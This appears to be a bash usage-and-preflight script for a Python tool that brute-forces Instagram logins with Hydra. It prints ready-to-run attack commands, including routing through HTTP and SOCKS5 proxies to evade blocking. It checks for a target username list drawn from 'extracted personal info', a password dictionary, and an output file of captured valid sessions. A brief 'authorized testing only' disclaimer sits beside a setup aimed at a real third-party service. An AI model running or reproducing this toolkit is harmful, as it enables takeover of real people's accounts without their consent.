#!/bin/bash
# Real Hydra Instagram Brute Force - Usage Examples
# 
# This script demonstrates how to use the real_hydra_brute_force.py
# which executes actual Hydra commands for penetration testing

echo "🔥 Real Hydra Instagram Brute Force - Usage Examples"
echo "=================================================="
echo ""

echo "📋 Available options:"
echo "  --verbose     : Show detailed Hydra output"
echo "  --proxy       : Use HTTP/SOCKS proxy"
echo "  --max-attempts: Limit attempts per username"
echo ""

echo "🎯 Example 1: Basic attack (verbose mode)"
echo "python real_hydra_brute_force.py --verbose"
echo ""

echo "🎯 Example 2: Attack through HTTP proxy"
echo "python real_hydra_brute_force.py --proxy http://127.0.0.1:8080 --verbose"
echo ""

echo "🎯 Example 3: Attack through SOCKS5 proxy"
echo "python real_hydra_brute_force.py --proxy socks5://127.0.0.1:1080"
echo ""

echo "🎯 Example 4: Limited attempts attack"
echo "python real_hydra_brute_force.py --max-attempts 100 --verbose"
echo ""

echo "📁 Required files:"
echo "  ✓ extracted_personal_info/target_usernames.txt (usernames to attack)"
echo "  ✓ wordlists/combined_passlist.txt (password dictionary)"
echo "  ✓ proxy_list.txt (optional: proxy list)"
echo ""

echo "📊 Output files:"
echo "  📄 sessions/valid_sessions.json (successful logins)"
echo "  📄 logs/hydra_brute_force.log (detailed logs)"
echo "  📄 logs/hydra_brute_force.log.hydra (raw Hydra output)"
echo ""

echo "⚠️  Warning: This tool is for authorized penetration testing only!"
echo "    Ensure you have proper authorization before use."
echo ""

# Check if files exist
echo "🔍 Checking required files..."

if [ -f "extracted_personal_info/target_usernames.txt" ]; then
    echo "  ✅ Target usernames file exists"
    echo "     Targets: $(wc -l < extracted_personal_info/target_usernames.txt) usernames"
else
    echo "  ❌ Target usernames file missing"
fi

if [ -f "wordlists/combined_passlist.txt" ]; then
    echo "  ✅ Password list exists"
    echo "     Passwords: $(wc -l < wordlists/combined_passlist.txt) passwords"
else
    echo "  ❌ Password list missing"
fi

if [ -f "proxy_list.txt" ]; then
    echo "  ✅ Proxy list exists"
    echo "     Proxies: $(wc -l < proxy_list.txt) proxies"
else
    echo "  ⚠️  Proxy list not found (optional)"
fi

# Check if Hydra is installed
if command -v hydra &> /dev/null; then
    echo "  ✅ Hydra is installed"
    echo "     Version: $(hydra -V 2>/dev/null | head -1)"
else
    echo "  ❌ Hydra not installed! Install with: apt-get install hydra"
fi

echo ""
echo "🚀 Ready to run? Execute one of the examples above!"
